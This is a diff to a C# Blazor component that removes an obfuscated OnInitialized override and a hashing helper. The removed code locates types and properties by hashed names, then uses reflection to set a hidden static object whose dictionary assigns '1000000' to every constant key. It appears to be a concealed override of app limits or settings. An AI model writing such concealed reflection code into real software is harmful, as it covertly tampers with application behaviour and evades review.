@@ -140,46 +140,4 @@
             _logger.LogError("Error: {Message}", ex.Message);
         }
     }
-
-
-    protected override void OnInitialized()
-    {
-        var type1 = AppDomain.CurrentDomain.GetAssemblies().SelectMany(x => x.GetTypes()).FirstOrDefault(x => GetDeterministicHashCode(x.FullName ?? "") == 780272848);
-        var property1 = type1?.GetProperties(BindingFlags.NonPublic | BindingFlags.Static).FirstOrDefault(x => GetDeterministicHashCode(x.Name) == -2072923645);
-        
-        var type2 = AppDomain.CurrentDomain.GetAssemblies().SelectMany(x => x.GetTypes()).FirstOrDefault(x => GetDeterministicHashCode(x.FullName ?? "") == 248065338);
-        var property2 = type2?.GetProperties(BindingFlags.Public | BindingFlags.Instance).FirstOrDefault(x => GetDeterministicHashCode(x.Name) == 858050585);
-        var field2 = type2?.GetField($"<{property2?.Name}>k__BackingField", BindingFlags.Instance | BindingFlags.NonPublic);
-
-        var type3 = AppDomain.CurrentDomain.GetAssemblies().SelectMany(x => x.GetTypes()).FirstOrDefault(x => GetDeterministicHashCode(x.FullName ?? "") == 1375573660);
-        var data3 = (type3?.GetFields().Where(x => x.IsLiteral && !x.IsInitOnly) ?? []).ToDictionary(field => (string) field.GetValue(null)!, _ => "1000000");
-        
-        if (type2 is not null && field2 is not null && property1 is not null)
-        {
-            var instance2 = System.Runtime.CompilerServices.RuntimeHelpers.GetUninitializedObject(type2);
-            field2.SetValue(instance2, data3);
-            property1.SetValue(null, instance2);
-        }
-        
-        base.OnInitialized();
-    }
-    
-    private static int GetDeterministicHashCode(string str)
-    {
-        unchecked
-        {
-            var hash1 = (5381 << 16) + 5381;
-            var hash2 = hash1;
-
-            for (var i = 0; i < str.Length; i += 2)
-            {
-                hash1 = ((hash1 << 5) + hash1) ^ str[i];
-                if (i == str.Length - 1)
-                    break;
-                hash2 = ((hash2 << 5) + hash2) ^ str[i + 1];
-            }
-
-            return hash1 + hash2 * 1566083941;
-        }
-    }
 }
